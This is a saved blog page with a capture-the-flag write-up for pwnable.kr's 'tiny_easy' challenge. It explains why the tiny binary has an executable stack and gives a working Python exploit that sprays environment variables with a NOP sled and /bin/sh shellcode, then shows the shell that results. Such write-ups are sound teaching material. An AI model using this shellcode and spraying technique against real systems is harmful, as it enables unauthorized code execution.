@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<!-- saved from url=(0056)https://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+    <title>Pwning tiny_easy (pwnable.kr)</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" type="text/css" href="./Pwning tiny_easy (pwnable.kr)_files/railscasts.css">
+    <script type="text/javascript" async="" src="./Pwning tiny_easy (pwnable.kr)_files/analytics.js"></script><script async="" src="./Pwning tiny_easy (pwnable.kr)_files/gtm.js"></script><script async="" src="./Pwning tiny_easy (pwnable.kr)_files/analytics.js"></script><script type="text/javascript" src="./Pwning tiny_easy (pwnable.kr)_files/highlight.pack.js"></script>
+    <link rel="stylesheet" type="text/css" href="./Pwning tiny_easy (pwnable.kr)_files/screen.css">
+    <link href="./Pwning tiny_easy (pwnable.kr)_files/css" rel="stylesheet" type="text/css">
+    <link rel="shortcut icon" href="https://eugenekolo.com/blog/assets/img/favicon.ico?v=2e5a7ea7d2">
+    
+    <link rel="canonical" href="http://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="amphtml" href="http://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/amp/">
+    
+    <meta property="og:site_name" content="Kolobyte">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Pwning tiny_easy (pwnable.kr)">
+    <meta property="og:description" content="This is a writeup of how to pwn tiny_easy on http://pwnable.kr, a great site for exploitation and reversing practice. Challenge statement   I made a pretty difficult pwn task.   However I also made a dumb rookie mistake and made it too easy :(   This is based on real event">
+    <meta property="og:url" content="http://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/">
+    <meta property="article:published_time" content="2015-12-25T02:16:55.000Z">
+    <meta property="article:modified_time" content="2016-01-23T07:49:39.000Z">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Pwning tiny_easy (pwnable.kr)">
+    <meta name="twitter:description" content="This is a writeup of how to pwn tiny_easy on http://pwnable.kr, a great site for exploitation and reversing practice. Challenge statement   I made a pretty difficult pwn task.   However I also made a dumb rookie mistake and made it too easy :(   This is based on real event">
+    <meta name="twitter:url" content="http://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Eugene Kolo">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Kolobyte",
+        "logo": "http://eugenekolo.com/blog/content/images/2016/01/heart-1.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Eugene Kolo",
+        "image": {
+            "@type": "ImageObject",
+            "url": "//www.gravatar.com/avatar/440977e8e1ca487a0979daf9c975ed3e?s=250&d=mm&r=x",
+            "width": 250,
+            "height": 250
+        },
+        "url": "http://eugenekolo.com/blog/author/eugene/",
+        "sameAs": []
+    },
+    "headline": "Pwning tiny_easy (pwnable.kr)",
+    "url": "https://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/",
+    "datePublished": "2015-12-25T02:16:55.000Z",
+    "dateModified": "2016-01-23T07:49:39.000Z",
+    "description": "This is a writeup of how to pwn tiny_easy on http://pwnable.kr, a great site for exploitation and reversing practice. Challenge statement   I made a pretty difficult pwn task.   However I also made a dumb rookie mistake and made it too easy :(   This is based on real event",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://eugenekolo.com/blog"
+    }
+}
+    </script>
+
+    <script type="text/javascript" src="./Pwning tiny_easy (pwnable.kr)_files/ghost-url.min.js"></script>
+<script type="text/javascript">
+ghost.init({
+	clientId: "ghost-frontend",
+	clientSecret: "bbf24e6b1c22"
+});
+</script>
+    <meta name="generator" content="Ghost 0.11">
+    <link rel="alternate" type="application/rss+xml" title="Kolobyte" href="https://eugenekolo.com/blog/rss/">
+<style type="text/css"></style><meta name="wecite_data" id="wecite-data" content="{&quot;Title&quot;:&quot;Pwning tiny_easy (pwnable.kr)&quot;,&quot;Author&quot;:&quot;&quot;,&quot;Abstract&quot;:&quot;&quot;,&quot;Image&quot;:&quot;&quot;,&quot;Keywords&quot;:&quot;&quot;,&quot;src_likes&quot;:&quot;0&quot;,&quot;src_shares&quot;:&quot;0&quot;,&quot;src_comments&quot;:&quot;0&quot;,&quot;src_reads&quot;:&quot;0&quot;,&quot;src_up&quot;:&quot;0&quot;,&quot;src_down&quot;:&quot;0&quot;,&quot;DateTime&quot;:&quot;2017-08-02 19:49:37&quot;,&quot;Reference Type&quot;:&quot;Web Page&quot;,&quot;Year&quot;:2017,&quot;SiteType&quot;:&quot;c3&quot;,&quot;URL&quot;:&quot;https://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/&quot;}"></head>
+
+<body class="post-template">
+  <div id="content">
+
+    <!--NOTE(eugenek): Left side bar follows -->
+    <div id="content-left">
+    <div class="vertical">
+    <div class="side-bar">
+
+        <div class="blog-title-wrap">
+        <a id="blog-logo" href="http://eugenekolo.com/blog"><img src="./Pwning tiny_easy (pwnable.kr)_files/heart-1.png" alt="Blog Logo"></a>
+        <h1 class="blog-title blog-title-text"><a class="blog-title-link" href="http://eugenekolo.com/blog">Kolobyte</a></h1>
+        </div>
+
+        <div class="blog-description-wrap">
+        <h2 class="blog-description">The blog of Eugene Kolo.
+
+Interests lay in building systems, hacking things, solving problems, and critical thinking.</h2>
+        </div>
+
+        <div class="nav-wrapper">
+    <ul class="nav">
+        <li class="nav-home"><a href="https://eugenekolo.com/blog/">Home</a></li>
+        <li class="nav-about-me"><a href="https://eugenekolo.com/blog/about-me">About Me</a></li>
+        <li class="nav-my-snippets"><a href="https://eugenekolo.com/blog/s">My Snippets</a></li>
+    </ul>
+</div>
+
+       
+        <div class="latest-10-posts-wrap">
+        <h1 class="latest-10-posts-title">Latest Posts</h1>
+        </div>
+
+        <div class="nav-wrapper">
+    <ul class="nav">
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/paybreak-generically-recovering-from-ransomware-including-wannacry/">PayBreak - Generically recovering from ransomware including WannaCry/WannaCryptor</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/hitcon-ctf-2016-writeups/">Hitcon CTF 2016 Writeups</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/csaw-qual-ctf-2016/">CSAW Qual CTF 2016 Writeups</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/top-5-snes-games/">Top 5 SNES games</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/pwnable-kr-cmd1-cmd2-and-flag/">Pwnable.kr - cmd1, cmd2, and flag</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/pwn2win-2016-python-tokens-writeup/">Pwn2win 2016 - Python Tokens Writeup</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/0ctf-2016-boomshakalaka-writeup/">0ctf 2016 Boomshakalaka (plane) Writeup</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/boston-key-party/">Boston Key Party CTF 2016 Writeups</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/internetwache-2016-ctf-writeups/">Internetwache 2016 CTF Writeups</a></li>
+            <li class="nav-latest-post"><a href="http://eugenekolo.com/blog/installing-and-setting-up-cuckoo-sandbox/">Installing and setting up Cuckoo Sandbox</a></li>
+    </ul>
+</div>
+
+    </div>
+    </div>
+    </div>
+
+    
+
+<!--NOTE(eugenek): This is the content loaded when a user clicks on a post of the website -->
+<div id="content-main">
+
+  <article class="post">
+    <h2 class="post-title"><a href="https://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/">Pwning tiny_easy (pwnable.kr)</a></h2>
+    <span class="post-meta"><time datetime="2015-12-25">December 25, 2015</time> </span>
+
+    <section class="post-content">
+      <p>This is a writeup of how to pwn tiny_easy on <a href="http://pwnable.kr/">http://pwnable.kr</a>, a great site for exploitation and reversing practice.</p>
+
+<h1 id="challengestatement">Challenge statement</h1>
+
+<blockquote>
+  <p>I made a pretty difficult pwn task.
+  However I also made a dumb rookie mistake and made it too easy :(
+  This is based on real event :) enjoy.</p>
+  
+  <p>ssh tiny_easy@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+
+<h1 id="analysis">Analysis</h1>
+
+<pre><code class="hljs ruby">eugenek<span class="hljs-variable">@frog</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ssh tiny_easy<span class="hljs-variable">@pwnable</span>.kr -p2222  
+tiny_easy<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./tiny_easy  
+<span class="hljs-constant">Segmentation</span> fault  
+</code></pre>
+
+<p>Okay, just segfaults. Let's dump and disassemble it.</p>
+
+<pre><code class="hljs ruby">tiny_easy<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>hexdump -<span class="hljs-constant">C</span> tiny_easy  
+<span class="hljs-number">00000000</span>  <span class="hljs-number">7</span>f <span class="hljs-number">45</span> <span class="hljs-number">4</span>c <span class="hljs-number">46</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  |.<span class="hljs-constant">ELF</span>............|  
+<span class="hljs-number">00000010</span>  <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">54</span> <span class="hljs-number">80</span> <span class="hljs-number">04</span> 08 <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  |........<span class="hljs-constant">T</span>...<span class="hljs-number">4</span>...|  
+<span class="hljs-number">00000020</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  |........<span class="hljs-number">4</span>. .....|  
+<span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">80</span> <span class="hljs-number">04</span> 08  |................|  
+<span class="hljs-number">00000040</span>  <span class="hljs-number">00</span> <span class="hljs-number">80</span> <span class="hljs-number">04</span> 08 <span class="hljs-number">5</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">5</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  |....<span class="hljs-constant">Z</span>...<span class="hljs-constant">Z</span>.......|  
+<span class="hljs-number">00000050</span>  <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">58</span> <span class="hljs-number">5</span>a <span class="hljs-number">8</span>b <span class="hljs-number">12</span>  ff d2                    |....<span class="hljs-constant">XZ</span>....|  
+<span class="hljs-number">0000005</span>a
+
+tiny_easy<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>objdump -<span class="hljs-constant">D</span> tiny_easy
+
+<span class="hljs-symbol">tiny_easy:</span>     file format elf32-i386
+
+tiny_easy<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>objdump -x tiny_easy
+
+<span class="hljs-symbol">tiny_easy:</span>     file format elf32-i386  
+tiny_easy  
+<span class="hljs-symbol">architecture:</span> i386, flags <span class="hljs-number">0x00000102</span><span class="hljs-symbol">:</span>  
+<span class="hljs-constant">EXEC_P</span>, <span class="hljs-constant">D_PAGED</span>  
+start address <span class="hljs-number">0x08048054</span>
+
+<span class="hljs-constant">Program</span> <span class="hljs-constant">Header</span><span class="hljs-symbol">:</span>  
+    <span class="hljs-constant">LOAD</span> off    <span class="hljs-number">0x00000000</span> vaddr <span class="hljs-number">0x08048000</span> paddr <span class="hljs-number">0x08048000</span> align <span class="hljs-number">2</span>**<span class="hljs-number">12</span>
+         filesz <span class="hljs-number">0x0000005a</span> memsz <span class="hljs-number">0x0000005a</span> flags r-x
+
+<span class="hljs-constant">Sections</span><span class="hljs-symbol">:</span>  
+<span class="hljs-constant">Idx</span> <span class="hljs-constant">Name</span>          <span class="hljs-constant">Size</span>      <span class="hljs-constant">VMA</span>       <span class="hljs-constant">LMA</span>       <span class="hljs-constant">File</span> off  <span class="hljs-constant">Algn</span>  
+<span class="hljs-constant">SYMBOL</span> <span class="hljs-constant">TABLE</span><span class="hljs-symbol">:</span>  
+no symbols  
+</code></pre>
+
+<p>Wow, it really is tiny! It's actually so small, that there is no executable section in it. That's not to say nothing <br>
+executes. This is obvious as we get a segmentation fault, it's doing something.</p>
+
+<p>Using GDB (or knowing the structure of an ELF and assembly), we can figure out what it's actually doing.</p>
+
+<p>It simply executes 4 instructions:</p>
+
+<pre><code class="hljs perl"><span class="hljs-number">58</span>      <span class="hljs-keyword">pop</span> eax  
+<span class="hljs-number">5</span>a      <span class="hljs-keyword">pop</span> edx  
+<span class="hljs-number">8</span>b12    mov edx,DWORD PTR [edx]  
+ffd2    call edx  
+</code></pre>
+
+<h1 id="howaprogramworks">How a program works</h1>
+
+<p>A program is usually launched with something like: <br>
+<code>myprog arg1 arg2 arg3</code> <br>
+Additionally programs are aware what's in our <code>$PATH</code> environment variable, as well as any other env vars it might need.</p>
+
+<p>So if you look carefully, that's 2 things a program gets/needs: <br>
+1. The arguments <br>
+2. The environment</p>
+
+<p>This is evident if you examine the entry point in UNIX: <br>
+<code>int main (int argc, char *argv[], char *envp[])</code> </p>
+
+<p>Without diving into how a program stack works on x86 (<a href="https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html">https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html</a>), what you need to know is that <code>envp</code>, <code>argv</code>, and <code>argc</code> get pushed onto the stack, in that order.</p>
+
+<pre><code class="hljs">| [    argc    ] &lt;-- This gets popped!
+v [    argv    ]  
+  [    envp    ]
+</code></pre>
+
+<h1 id="challenges">Challenges</h1>
+
+<p>The situation looks grim if you examine the binary with checksec, and also check if ASLR is enabled on the server:</p>
+
+<pre><code class="hljs ruby"><span class="hljs-constant">RELRO</span>           <span class="hljs-constant">STACK</span> <span class="hljs-constant">CANARY</span>      <span class="hljs-constant">NX</span>            <span class="hljs-constant">PIE</span>             <span class="hljs-constant">RPATH</span>      <span class="hljs-constant">RUNPATH</span>  <span class="hljs-constant">FORTIFY</span> <span class="hljs-constant">FORTIFIED</span> <span class="hljs-constant">FORTIFY</span>-able  <span class="hljs-constant">FILE</span>  
+<span class="hljs-constant">No</span> <span class="hljs-constant">RELRO</span>        <span class="hljs-constant">No</span> canary found   <span class="hljs-constant">NX</span> enabled    <span class="hljs-constant">No</span> <span class="hljs-constant">PIE</span>          <span class="hljs-constant">No</span> <span class="hljs-constant">RPATH</span>   <span class="hljs-constant">No</span> <span class="hljs-constant">RUNPATH</span>   <span class="hljs-constant">No</span>  <span class="hljs-number">0</span>       <span class="hljs-number">0</span>/home/tiny_easy/tiny_easy
+
+tiny_easy<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /proc/sys/kernel/randomize_va_space  
+<span class="hljs-number">2</span>  
+</code></pre>
+
+<p>NX and ASLR are both enabled. This is very problematic, but let's look back to the hint given to us in the beginning.</p>
+
+<p>The hint for this challenge is:  </p>
+
+<blockquote>
+  <p>"However I also made a dumb rookie mistake and made it too easy :(
+  This is based on real event :) enjoy."</p>
+</blockquote>
+
+<p>The rookie mistake here is that if you look above, there is no stack program header. So while NX (non-executable stack) is enabled for the machine, NX is not enabled for this binary. That means the solution can leverage arbitrary execution on the stack.</p>
+
+<h1 id="solution">Solution</h1>
+
+<p>We need to get our payload onto the stack. We know <code>argc</code>, <code>argv</code>, and <code>envp</code> get pushed onto the stack. So let's put our shellcode into some environment variables. We also need to redirect program flow, recall in the analysis section the four instructions that the program is doing. It pops <code>argc</code> into <code>eax</code>, pops <code>argv</code> into <code>edx</code>, and then starts executing what's pointed by <code>edx</code>. </p>
+
+<p>Normally the first argument in <code>argv</code> is the name of the program, however this is not technically a requirement we can change it to anything we want, evident if you look at the typical structure of an <code>execv</code> call, <code>execv("myprog", {"myprog", "arg1", "arg2"})</code>, notice the repeated "myprog".</p>
+
+<p>ASLR is enabled, so we don't know the exact address that our payload is at on the stack. So we have to spray the stack by creating a bunch of environment variables and nopsleds.</p>
+
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">import</span> os  
+<span class="hljs-keyword">import</span> subprocess
+
+jumpto = <span class="hljs-string">"\xb0\xaf\xb5\xff"</span>  
+shellcode = <span class="hljs-string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"</span>  
+nopsled = <span class="hljs-string">"\x90"</span>*<span class="hljs-number">4096</span>;  
+payload = nopsled+shellcode
+
+myenv = {}  
+<span class="hljs-comment"># Arbitrary largeish number</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):  
+    myenv[<span class="hljs-string">"spray"</span>+str(i)] = payload
+
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:  
+    p = subprocess.Popen([jumpto], executable=<span class="hljs-string">"/home/tiny_easy/tiny_easy"</span>, env=myenv)
+    p.wait()
+</code></pre>
+
+<p>Executing...  </p>
+
+<pre><code class="hljs ruby">tiny_easy<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/tmp/eugenek_tiny_easy</span><span class="hljs-variable">$ </span>python pwn.py  
+<span class="hljs-variable">$ </span>cat /home/tiny_easy/flag
+<span class="hljs-constant">What</span> a tiny task <span class="hljs-symbol">:</span>) &lt;redacted&gt;  
+</code></pre>
+
+<h1 id="lookingahead">Looking ahead</h1>
+
+<p>This was <em>tiny_easy</em>, I'm looking forward to giving <em>tiny</em> a try.</p>
+
+<p>You can see that <em>tiny</em> doesn't have the rookie mistake as this one does.</p>
+
+<pre><code class="hljs ruby">eugenek<span class="hljs-variable">@frog</span><span class="hljs-symbol">:~/Downloads</span><span class="hljs-variable">$ </span>objdump -x tiny
+
+<span class="hljs-symbol">tiny:</span>     file format elf32-i386  
+...
+   <span class="hljs-constant">STACK</span> off    <span class="hljs-number">0x00000000</span> vaddr <span class="hljs-number">0x00000000</span> paddr <span class="hljs-number">0x00000000</span> align <span class="hljs-number">2</span>**<span class="hljs-number">4</span>
+         filesz <span class="hljs-number">0x00000000</span> memsz <span class="hljs-number">0x00000000</span> flags rw-
+</code></pre>
+
+<p><em>tiny</em> doesn't have an executable stack! :(</p>
+    </section>
+
+    <!-- NOTE(eugenek): Footer with social media junk, can ask to save starving Jimmy Wales here -->
+    <footer class="post-footer">
+      <section class="share">
+        <h4>Share this post</h4>
+        <a class="icon-twitter" href="http://twitter.com/share?text=Pwning%20tiny_easy%20(pwnable.kr)&amp;url=https://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/" onclick="window.open(this.href, &#39;twitter-share&#39;, &#39;width=550,height=235&#39;);return false;">
+            <span class="hidden">Twitter</span>
+        </a>
+        <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/" onclick="window.open(this.href, &#39;facebook-share&#39;,&#39;width=580,height=296&#39;);return false;">
+            <span class="hidden">Facebook</span>
+        </a>
+        <a class="icon-google-plus" href="https://plus.google.com/share?url=https://eugenekolo.com/blog/pwning-tiny_easy-pwnable-kr/" onclick="window.open(this.href, &#39;google-plus-share&#39;, &#39;width=490,height=530&#39;);return false;">
+            <span class="hidden">Google+</span>
+        </a>
+      </section>
+    </footer>
+
+  </article>
+
+</div>
+
+
+    <!--NOTE(eugenek): Site-wide Footer -->
+    <footer class="site-footer">
+        <a class="subscribe icon-feed" href="http://eugenekolo.com/blog/rss/"><span class="tooltip">Subscribe!</span></a>
+        <div class="">
+             <section class="copyright">All content copyright <a href="https://eugenekolo.com/">Kolobyte</a> © 2015 • All rights reserved.</section>
+             <section class="poweredby">
+               <a href="https://github.com/eugenekolo/cozy-youth-theme">Cozy Youth</a> forked from Kolotheme by 
+               <a href="http://twitter.com/@eugenekolo">@eugenekolo</a></section>
+        </div>
+    </footer>
+
+    <!-- You can safely delete this line if your theme does not require jQuery -->
+<script type="text/javascript" src="./Pwning tiny_easy (pwnable.kr)_files/jquery-1.11.3.min.js"></script>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-62930563-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+<!-- Google Tag Manager -->
+<noscript>&lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-MDVFRS"
+height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MDVFRS');</script>
+<!-- End Google Tag Manager -->
+
+    <script type="text/javascript" src="./Pwning tiny_easy (pwnable.kr)_files/index.js"></script>
+
+  </div>
+
+
+<script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/public/common.js"></script><script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/common/we-general.js"></script></body><div></div></html>
